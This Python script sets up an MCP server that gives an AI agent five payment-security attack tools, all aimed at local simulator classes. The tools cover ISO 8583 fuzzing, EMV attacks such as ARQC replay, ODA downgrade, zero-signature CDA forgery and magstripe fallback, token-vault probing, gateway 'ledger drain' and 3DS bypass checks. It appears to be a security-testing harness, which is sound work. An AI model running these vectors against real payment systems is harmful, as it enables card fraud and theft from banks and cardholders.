#!/usr/bin/env python3
"""
Banking MCP Server — Red Team Banking & Payment Security Tools
Exposes ISO 8583 fuzz, EMV exploits, token vault tests, payment gateway
auth bypass, and 3DS frictionless bypass as MCP tools over stdio transport.

Tools:
  1. iso8583_fuzz         — Run ISO 8583 fuzz harness against target
  2. emv_exploit          — Run EMV attack vectors (ARQC replay, ODA bypass, etc.)
  3. emv_token_test       — Test token vault detokenization
  4. payment_gateway_test — Test unified payment gateway auth bypass
  5. three_ds_bypass      — Test 3DS frictionless bypass
"""
import sys, json, time
from pathlib import Path

ROOT_DIR = r"C:\Users\mobil\orca\projects\my 1st"
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from mcp.server.fastmcp import FastMCP
from iso8583_engine import ISO8583Message, PaymentSwitchSimulator
from unified_payment_gateway import UnifiedPaymentGateway
from emv_tokenization_engine import BERTLVParser, NetworkTokenizationVault
from three_ds_simulator import ThreeDSServer, DirectoryServer, AccessControlServer

app = FastMCP("banking-mcp-server")


# ── Helpers ─────────────────────────────────────────────────────────────────

def _build_f55(cryptogram_hex="4B73A862803893C5", atc="0001", aip="3800", include_oda=True):
    """Construct EMV Field 55 BER-TLV payload."""
    f55 = "9F2608" + cryptogram_hex + "9F270180"
    f55 += "9F100706010A03A00000"
    f55 += "9F370438A4B290"
    f55 += "9F3602" + atc
    f55 += "95050000000000"
    f55 += "9A032608289C0100"
    f55 += "9F0206000000015000"
    f55 += "5F2A020840"
    f55 += "8202" + (aip if include_oda else "0000")
    return f55


def _build_iso(dpan, amount_cents, stan="000001", f55_hex=None):
    """Build ISO 8583 0100 message, optionally with EMV Field 55."""
    msg = ISO8583Message(mti="0100")
    msg.set_field(2, dpan)
    msg.set_field(3, "000000")
    msg.set_field(4, f"{amount_cents:012d}")
    msg.set_field(7, "0828080000")
    msg.set_field(11, stan)
    msg.set_field(41, "TERM0001")
    msg.set_field(49, "840")
    if f55_hex:
        msg.set_field(48, f55_hex)
    return msg


# ── 1. ISO 8583 Fuzz Harness ────────────────────────────────────────────────

@app.tool()
def iso8583_fuzz(vector: str = "all", messages_per_vector: int = 1000) -> str:
    """Run ISO 8583 fuzz harness against the payment switch simulator.
    Vectors: legit, length_overflow, bitmap_phantom, amount_mismatch,
             truncated_mti, pan_F_padding, velocity_check, stan_collision, all"""
    switch = PaymentSwitchSimulator()

    def gen_legit(stan="000001"):
        m = ISO8583Message(mti="0100")
        m.set_field(2, "4111111111111111"); m.set_field(3, "000000")
        m.set_field(4, "000000010000"); m.set_field(7, "0828080000")
        m.set_field(11, stan); m.set_field(41, "TERM0001"); m.set_field(49, "840")
        return m

    def atk_length():
        m = gen_legit(); m.set_field(2, "9"*99); return m
    def atk_phantom():
        m = gen_legit(); m.set_field(127, "phantom"); return m
    def atk_amount():
        m = gen_legit(); m.set_field(4, "000000001000"); m.set_field(49, "392"); return m
    def atk_truncated():
        m = gen_legit(); m.mti = "01"; return m
    def atk_padding():
        m = gen_legit(); m.set_field(2, "F" + "411111111111111"); return m
    def atk_velocity():
        m = gen_legit(); m.set_field(4, "999999999999"); return m

    vector_map = {
        "legit": gen_legit, "length_overflow": atk_length,
        "bitmap_phantom": atk_phantom, "amount_mismatch": atk_amount,
        "truncated_mti": atk_truncated, "pan_F_padding": atk_padding,
        "velocity_check": atk_velocity,
    }

    vectors = list(vector_map.keys()) if vector == "all" else [vector]
    findings = []
    for vname in vectors:
        gen = vector_map.get(vname)
        if not gen: continue
        succ, errs = 0, 0
        for _ in range(messages_per_vector):
            try:
                switch.process(gen().pack()); succ += 1
            except Exception as e:
                errs += 1
                if not any(f.get("attack") == vname for f in findings):
                    findings.append({"attack": vname, "error": str(e)[:200]})

    if vector in ("all", "stan_collision"):
        a = gen_legit("000001"); b = gen_legit("000001")
        switch.process(a.pack()); switch.process(b.pack())
        findings.append({"attack": "stan_collision", "note": "Same STAN accepted twice — no idempotency"})

    return json.dumps({
        "vuln_class": "ISO 8583 Fuzz",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "vectors_tested": len(vectors), "messages_per_vector": messages_per_vector,
        "findings": findings,
    }, indent=2)


# ── 2. EMV Exploit Vectors ─────────────────────────────────────────────────

@app.tool()
def emv_exploit(attack: str = "all") -> str:
    """Run EMV attack vectors against the unified payment gateway.
    Attacks: arqc_replay, oda_bypass, dda_cda_forgery, emv_fallback, atc_desync, all"""
    gw = UnifiedPaymentGateway()

    def arqc_replay():
        cg = "AABBCCDD11223344"
        m1 = _build_iso("4800112233445566", 10000, "100001", _build_f55(cryptogram_hex=cg))
        r1 = ISO8583Message.unpack(gw.process_authorization(m1.pack())[0])
        m2 = _build_iso("4800112233445566", 999999, "100002", _build_f55(cryptogram_hex=cg))
        r2 = ISO8583Message.unpack(gw.process_authorization(m2.pack())[0])
        return {"attack": "ARQC_replay", "legit_resp": r1.get_field(39),
                "replay_resp": r2.get_field(39), "vulnerable": r2.get_field(39) == "00",
                "note": "Same ARQC accepted for different amounts"}

    def oda_bypass():
        m1 = _build_iso("4800112233445566", 50000, "200001", _build_f55(aip="3800"))
        r1 = ISO8583Message.unpack(gw.process_authorization(m1.pack())[0])
        m2 = _build_iso("4800112233445566", 50000, "200002", _build_f55(aip="0000", include_oda=False))
        r2 = ISO8583Message.unpack(gw.process_authorization(m2.pack())[0])
        return {"attack": "ODA_bypass", "vulnerable": r2.get_field(39) == "00",
                "note": "AIP downgrade to 0000 accepted"}

    def dda_cda_forgery():
        f55 = _build_f55() + "9F4B40" + "00"*64
        m = _build_iso("4800112233445566", 75000, "300001", f55)
        r = ISO8583Message.unpack(gw.process_authorization(m.pack())[0])
        return {"attack": "DDA_CDA_forgery", "vulnerable": r.get_field(39) == "00",
                "note": "All-zero CDA signature accepted"}

    def emv_fallback():
        m1 = _build_iso("4800112233445566", 30000, "400001", _build_f55())
        r1 = ISO8583Message.unpack(gw.process_authorization(m1.pack())[0])
        m2 = _build_iso("4800112233445566", 30000, "400002")  # No F55
        r2 = ISO8583Message.unpack(gw.process_authorization(m2.pack())[0])
        return {"attack": "EMV_fallback", "emv_resp": r1.get_field(39),
                "fallback_resp": r2.get_field(39), "vulnerable": r2.get_field(39) == "00",
                "note": "Magstripe fallback accepted without cryptogram"}

    def atc_desync():
        res = []
        for i in range(3):
            m = _build_iso("4800112233445566", 10000, f"50000{i+1}", _build_f55(atc="0005"))
            r = ISO8583Message.unpack(gw.process_authorization(m.pack())[0])
            res.append(r.get_field(39))
        return {"attack": "ATC_desync", "vulnerable": all(x == "00" for x in res),
                "note": "Same ATC (0005) accepted 3x"}

    attack_map = {
        "arqc_replay": arqc_replay, "oda_bypass": oda_bypass,
        "dda_cda_forgery": dda_cda_forgery, "emv_fallback": emv_fallback,
        "atc_desync": atc_desync,
    }
    fns = list(attack_map.values()) if attack == "all" else [attack_map.get(attack)]
    fns = [f for f in fns if f]

    findings = []
    for fn in fns:
        try: findings.append(fn())
        except Exception as e: findings.append({"attack": fn.__name__, "error": str(e)[:200]})

    return json.dumps({
        "vuln_class": "EMV Exploitation",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "attacks_tested": len(findings),
        "vulnerable_count": sum(1 for f in findings if f.get("vulnerable")),
        "findings": findings,
    }, indent=2)


# ── 3. EMV Token Vault Test ─────────────────────────────────────────────────

@app.tool()
def emv_token_test(dpan: str = "4800112233445566",
                   cryptogram: str = "4B73A862803893C5",
                   channel: str = "CONTACTLESS") -> str:
    """Test token vault detokenization.
    Tests: valid, invalid_dpan, wrong_channel, short_cryptogram, empty_cryptogram."""
    vault = NetworkTokenizationVault()
    tests = [
        ("valid", dpan, cryptogram, channel),
        ("invalid_dpan", "9999999999999999", cryptogram, channel),
        ("wrong_channel", dpan, cryptogram, "ECOMMERCE"),
        ("short_cryptogram", dpan, "AABB", channel),
        ("empty_cryptogram", dpan, "", channel),
    ]
    results = []
    for name, d, c, ch in tests:
        r = vault.detokenize(dpan=d, cryptogram=c, channel=ch)
        results.append({"test": name, **r})

    return json.dumps({
        "vuln_class": "EMV Tokenization Vault",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "tests_run": len(results), "results": results,
    }, indent=2)


# ── 4. Payment Gateway Auth Bypass ──────────────────────────────────────────

@app.tool()
def payment_gateway_test(dpan: str = "4800112233445566",
                         amount_cents: int = 1000000,
                         stan: str = "999999") -> str:
    """Test unified payment gateway auth bypass.
    Tests: high_amount, zero_amount, missing_emv, unknown_dpan, ledger_drain."""
    gw = UnifiedPaymentGateway()
    results = []

    def run_test(name, dpan, amt, stan, f55=True):
        m = _build_iso(dpan, amt, stan, _build_f55() if f55 else None)
        rb, audit = gw.process_authorization(m.pack())
        r = ISO8583Message.unpack(rb)
        results.append({"test": name, "response_code": r.get_field(39),
                        "decision": audit.get("decision")})

    run_test("high_amount", dpan, amount_cents, stan)
    run_test("zero_amount", dpan, 0, "000001")
    run_test("missing_emv", dpan, 50000, "000002", f55=False)
    run_test("unknown_dpan", "0000000000000000", 10000, "000003")

    # Ledger drain test
    gw2 = UnifiedPaymentGateway()
    drain = []
    for i in range(5):
        m = _build_iso("4800112233445566", 500000, f"10000{i}")
        r = ISO8583Message.unpack(gw2.process_authorization(m.pack())[0])
        drain.append({"iteration": i+1, "response": r.get_field(39)})
    results.append({"test": "ledger_drain", "drain_results": drain})

    return json.dumps({
        "vuln_class": "Payment Gateway Auth Bypass",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "tests_run": len(results), "results": results,
    }, indent=2)


# ── 5. 3DS Frictionless Bypass ──────────────────────────────────────────────

@app.tool()
def three_ds_bypass(pan: str = "4111111111111111",
                    amount_cents: int = 4500,
                    mcc: str = "5411") -> str:
    """Test 3DS frictionless bypass vectors.
    Tests: low_risk, high_amount, high_risk_mcc, high_risk_card, wrong_otp, correct_otp."""
    acs = AccessControlServer()
    ds = DirectoryServer(acs)
    three_ds = ThreeDSServer(ds)
    results = []

    r1 = three_ds.initiate_authentication("MERCH-001", pan, amount_cents, "840", mcc)
    results.append({"test": "low_risk", "transStatus": r1.get("transStatus"),
                    "eci": r1.get("eci")})

    r2 = three_ds.initiate_authentication("MERCH-001", pan, 9999999, "840", mcc)
    results.append({"test": "high_amount", "transStatus": r2.get("transStatus"),
                    "eci": r2.get("eci")})

    r3 = three_ds.initiate_authentication("MERCH-001", pan, 1000, "840", "7995")
    results.append({"test": "high_risk_mcc", "transStatus": r3.get("transStatus"),
                    "eci": r3.get("eci")})

    r4 = three_ds.initiate_authentication("MERCH-001", "5500000000000004", 100, "840", "5411")
    results.append({"test": "high_risk_card", "transStatus": r4.get("transStatus"),
                    "eci": r4.get("eci")})

    # Challenge with wrong OTP
    for r in [r2, r3, r4]:
        if r.get("transStatus") == "C":
            cres = acs.process_creq({
                "threeDSServerTransID": r["threeDSServerTransID"],
                "acsTransID": r["acsTransID"], "acctNumber": pan,
                "challengeDataEntry": "000000", "messageType": "CReq",
                "messageVersion": "2.2.0"
            })
            results.append({"test": "wrong_otp", "transStatus": cres.get("transStatus"),
                            "eci": cres.get("eci"),
                            "bypass_risk": cres.get("transStatus") == "Y"})
            break

    # Challenge with correct OTP for high-risk card
    if r4.get("transStatus") == "C":
        cres = acs.process_creq({
            "threeDSServerTransID": r4["threeDSServerTransID"],
            "acsTransID": r4["acsTransID"], "acctNumber": "5500000000000004",
            "challengeDataEntry": "123456", "messageType": "CReq",
            "messageVersion": "2.2.0"
        })
        results.append({"test": "correct_otp", "transStatus": cres.get("transStatus"),
                        "eci": cres.get("eci")})

    return json.dumps({
        "vuln_class": "3DS Frictionless Bypass",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "tests_run": len(results), "results": results,
    }, indent=2)


if __name__ == "__main__":
    app.run()
